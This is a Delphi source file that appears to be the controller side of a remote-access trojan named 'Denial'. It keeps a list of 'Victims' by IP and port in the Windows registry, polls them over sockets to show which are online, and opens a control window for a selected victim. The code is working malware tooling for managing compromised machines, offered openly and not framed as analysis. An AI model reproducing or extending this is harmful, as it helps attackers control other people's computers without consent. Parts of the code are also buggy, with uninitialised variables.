unit Unit2;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, Menus, Registry, ExtCtrls, ScktComp, StdCtrls, Buttons;

type
  TForm2 = class(TForm)
    ListView1: TListView;
    StatusBar1: TStatusBar;
    Timer1: TTimer;
    Timer2: TTimer;
    ClientSocket1: TClientSocket;
    Edit1: TEdit;
    Edit2: TEdit;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    Button2: TButton;
    Label1: TLabel;
    Label2: TLabel;
    MainMenu1: TMainMenu;
    File1: TMenuItem;
    Exit1: TMenuItem;
    About1: TMenuItem;
    About2: TMenuItem;
    CheckBox1: TCheckBox;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormConstrainedResize(Sender: TObject; var MinWidth,
      MinHeight, MaxWidth, MaxHeight: Integer);
    procedure adduser(ip,port:string);
    procedure AddIP1Click(Sender: TObject);
    procedure RemoveIP1Click(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
    procedure SaveReg;
    procedure loadreg;
    procedure Settings1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure About2Click(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ClientSocket1Disconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Timer2Timer(Sender: TObject);
    procedure ClientSocket1Connect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SpeedButton1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;
  IC:TForm;
  vic_nr:integeR;
implementation

uses Unit3, Unit4, Unit5, Unit6, Settings, Unit1;

{$R *.dfm}

procedure TForm2.loadreg;
var
 Reg:TRegIniFile;
 i,j:integer;
 vic,port:string;
begin
 REG := TRegIniFile.Create;
 REG.RootKey := HKEY_LOCAL_MACHINE;
 J:= strtoint(Reg.ReadString('Software\Denial','Victims','0'));
 if j = 0 then exit;
 For i:=0 to j do begin
  Vic := Reg.ReadString('Software\Denial','Victims'+inttostr(i),'0');
  port := copy(Vic,pos(':',vic)+1,length(vic));
  port := copy(port,1,pos(';',port)-1);
  vic := copy(vic,1,pos(':',vic)-1);
  IF (Vic <> '') And
     (Port <> '') Then
  Adduser(vic,port);
 end;
 reg.Free;
end;

procedure TForm2.savereg;
var
 Reg:TRegIniFile;
 i:integer;
begin
 REG := TRegIniFile.Create;
 REG.RootKey := HKEY_LOCAL_MACHINE;
 if not Reg.KeyExists('software\Denial') then begin
  Reg.CreateKey('Software\Denial');
  Reg.WriteString('Software\Denial','Victims','0');
 end else begin
 For i:=0 to 4000 do begin
  try
   Reg.DeleteKey('Software\Denial','Victims'+inttostr(i));
  except
   break;
  end;
 end;
  Reg.WriteString('Software\Denial','Victims',inttostr(listview1.Items.Count));
  if listview1.Items.Count > 0 then
   for i:=0 to listview1.Items.Count-1 do
    reg.WriteString('Software\Denial','Victims'+inttostr(i),listview1.items[i].SubItems[0]+':'+listview1.items[i].SubItems[1]+';');
 end;
   reg.Free; 
end;

procedure TForm2.adduser(ip,port:string);
var
 user:tlistitem;
 i:integer;
begin
 if listview1.Items.Count > 0 then
  for i:=0 to listview1.items.Count -1 do
   if (listview1.Items[i].SubItems[0] = ip) and (listview1.Items[i].SubItems[1] = port) then exit;
 user := listview1.Items.Add;
 user.Caption := 'Offline';
 user.SubItems.Add(ip);
 user.SubItems.add(port);
end;

procedure TForm2.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 Exitprocess(0);
end;

procedure TForm2.FormConstrainedResize(Sender: TObject; var MinWidth,
  MinHeight, MaxWidth, MaxHeight: Integer);
begin
   MinHeight := 159;
   MinWidth  := 289;
end;

procedure TForm2.AddIP1Click(Sender: TObject);
begin
form3.show;
end;

procedure TForm2.RemoveIP1Click(Sender: TObject);
begin
 if listview1.ItemIndex = -1 then exit;
 listview1.items[listview1.ItemIndex].Delete;
 savereg;
end;

procedure TForm2.Exit1Click(Sender: TObject);
begin
exitprocess(0);
end;

procedure TForm2.Settings1Click(Sender: TObject);
begin
form4.Show;
end;

procedure TForm2.Timer1Timer(Sender: TObject);
begin
if clientsocket1.Active then exit;
if not checkbox1.Checked then exit;
if listview1.items.Count >= 1 then begin
 if vic_nr >= listview1.items.Count then vic_nr := 0;
 Listview1.Items[vic_nr].Caption := 'Update';
 Clientsocket1.host := listview1.items[vic_nr].SubItems[0];
 Clientsocket1.Port := strtoint(listview1.items[vic_nr].SubItems[1]);
 Clientsocket1.Active := true;
end;
end;

procedure TForm2.About2Click(Sender: TObject);
begin
form5.show;
end;

Procedure LoadForm;
var
 F:Integer;
begin
 F:= (Form2.listview1.ItemIndex);
 if Form2.listview1.Items[F].Caption <> 'Online' then exit;
 if findwindow('TForm6',pchar('Denial Client ('+Form2.listview1.Items[F].SubItems[0]+')'))>0 then exit;
 Inertia_ip   := Form2.listview1.Items[F].SubItems[0];
 Inertia_port := Form2.listview1.Items[F].SubItems[1];
 Application.CreateForm(TForm6,IC);
 IC.Show;
end;

procedure TForm2.ListView1DblClick(Sender: TObject);
var
 a : dword;
begin
 if listview1.ItemIndex = -1 then exit;
 LoadForm;
end;

procedure TForm2.FormCreate(Sender: TObject);
var
 a1,a2:integer;
begin
While (Form2.Width-speedbutton1.left) < speedbutton1.Width Do Begin
 SpeedButton1.Left := 160;
 Edit1.width := 105;
 Edit2.Width := 41 ;
 Form2.Width := Form2.Width + 1;
end;

While (a1-a2) < statusbar1.Height Do Begin
 ListView1.Height := 232;
 Checkbox1.Top := 256;
 Statusbar1.top := 272;
 Form2.Height := Form2.Height + 1;
end;

vic_nr := 0;
LoadReg;
SaveReg;
end;

procedure TForm2.ClientSocket1Disconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
TRY
 Listview1.Items[vic_nr].Caption := 'Offline';
EXCEPT
 if vic_nr >= (listview1.Items.Count-1) then vic_nr := 0;
END;
 if vic_nr >= (listview1.Items.Count-1) then vic_nr := 0 else inc(vic_nr,1);
if not checkbox1.Checked then begin
 ClientSocket1.Active := False;
 exit;
end;
try
 ClientSocket1.Active := False;
except
 ;
end;
if vic_nr >= listview1.items.count then exit;
if listview1.items.Count > 1 then begin
 Listview1.Items[vic_nr].Caption := 'Update';
 if vic_nr >= listview1.items.count then exit; 
 Clientsocket1.host := listview1.items[vic_nr].SubItems[0];
 if vic_nr >= listview1.items.count then exit;
 Clientsocket1.Port := strtoint(listview1.items[vic_nr].SubItems[1]);
  if vic_nr >= listview1.items.count then exit;
 Clientsocket1.Active := true;
end;
end;

procedure TForm2.ClientSocket1Error(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
Errorcode :=0;
TRY
 Listview1.Items[vic_nr].Caption := 'Offline';
EXCEPT
 if vic_nr >= (listview1.Items.Count-1) then vic_nr := 0;
END;
 if vic_nr >= (listview1.Items.Count-1) then
  vic_nr := 0
 else
  inc(vic_nr,1);
if not checkbox1.Checked then begin
 ClientSocket1.Active := False;
 exit;
end;
try
 ClientSocket1.Active := False;
except
 ;
end;
if vic_nr >= listview1.items.count then exit;
if listview1.items.Count > 1 then begin
 Listview1.Items[vic_nr].Caption := 'Update';
 if vic_nr >= listview1.items.count then exit;
 Clientsocket1.host := listview1.items[vic_nr].SubItems[0];
 if vic_nr >= listview1.items.count then exit;
 Clientsocket1.Port := strtoint(listview1.items[vic_nr].SubItems[1]);
 if vic_nr >= listview1.items.count then exit;
 Clientsocket1.Active := true;
end;
end;

procedure TForm2.Timer2Timer(Sender: TObject);
var
 i,onl:integer;
begin
 if listview1.Items.Count < 1 then exit;
 for i:=0 to listview1.Items.Count -1 do
  if listview1.items[i].Caption = 'Online' then inc(onl,1);
 statusbar1.Panels[1].text := inttostr(onl)+'/'+inttostr(listview1.Items.Count)+' Online';
end;

procedure TForm2.ClientSocket1Connect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
TRY
 If (ListView1.Items.Count = 0) or (Vic_Nr >= ListView1.Items.Count) then begin
  ClientSocket1.Active := false;
  exit;
 end;
 Listview1.Items[vic_nr].Caption := 'Online';
EXCEPT
 if vic_nr >= listview1.Items.Count-1 then vic_nr := 0;
END;
 if vic_nr >= listview1.Items.Count-1 then vic_nr := 0 else inc(vic_nr,1);
if listview1.items.Count > 1 then begin
 Listview1.Items[vic_nr].Caption := 'Update';
if vic_nr < listview1.items.count-1 then begin
Repeat
 Try
  Clientsocket1.Active := false;
 Except
  ;
 End;
Until ClientSocket1.Active = false;
if not checkbox1.Checked then begin
 ClientSocket1.Active := False;
 exit;
end;
 if vic_nr >= listview1.items.count then exit;
 Clientsocket1.host := listview1.items[vic_nr].SubItems[0];
 if vic_nr >= listview1.items.count then exit;
 Clientsocket1.Port := strtoint(listview1.items[vic_nr].SubItems[1]);
 if vic_nr >= listview1.items.count then exit;
 Clientsocket1.Active := True;
end;
end;
end;

procedure TForm2.SpeedButton1Click(Sender: TObject);
Function ISNR(str:String):boolean;
var
 abc:string;
 i:integer;
begin
 abc :='0123456789';
 result := false;
 if str = '' then exit;
 result := true;
 for i:=1 to length(str) do
  if pos(copy(str,i,1),abc)=0 then result := false;
end;

Function IP(ips:String):boolean;
var
 I:Integer;
 ip1,ip2,ip3,ip4:string;
begin
 result := false;
 i := pos('.',ips)-1;
 if i = 0 then exit;
 ip1 := copy(ips,1,i);

 ips := copy(ips,pos('.',ips)+1,length(ips));

 i := pos('.',ips)-1;
 if i = 0 then exit;
 ip2 := copy(ips,1,i);

 ips := copy(ips,pos('.',ips)+1,length(ips));

 i := pos('.',ips)-1;
 if i = 0 then exit;
 ip3 := copy(ips,1,i);

 ips := copy(ips,pos('.',ips)+1,length(ips));

 ip4 := ips;
 if ip4 = '' then Exit;

 if not isnr(ip1) then exit;
 if not isnr(ip2) then exit;
 if not isnr(ip3) then exit;
 if not isnr(ip4) then exit;

 if (strtoint(ip1) > 254) or (strtoint(ip1)<0) then exit;
 if (strtoint(ip2) > 254) or (strtoint(ip2)<0) then exit;
 if (strtoint(ip3) > 254) or (strtoint(ip3)<0) then exit;
 if (strtoint(ip4) > 254) or (strtoint(ip4)<0) then exit;

 result := true;

end;

function Port(ips:String):boolean;
begin
 result := false;
 if not isnr(ips) then exit;
 if strtoint(ips) > 36999 then exit;
 result := true;
end;

begin
 if (ip(edit1.text)) and (port(edit2.text)) then begin
  ADDuser(Edit1.text,edit2.text);
  SaveReg;
 end;
end;

procedure TForm2.Button2Click(Sender: TObject);
begin
form3.show;
end;

procedure TForm2.SpeedButton2Click(Sender: TObject);
begin
If ListView1.ItemIndex <> -1 then begin
 ListView1.Items[ListView1.ItemIndex].Delete;
 SaveReg;
end;
end;

procedure TForm2.CheckBox1Click(Sender: TObject);
var
 i:integer;
begin
If not Checkbox1.Checked then begin
 ClientSocket1.Active := false;
 if listview1.items.count = -1 then exit;
 for i:=0 to listview1.items.count -1 do
  if listview1.items[i].caption <> 'Online' then
   listview1.items[i].caption := 'Offline';
end;
end;

end.
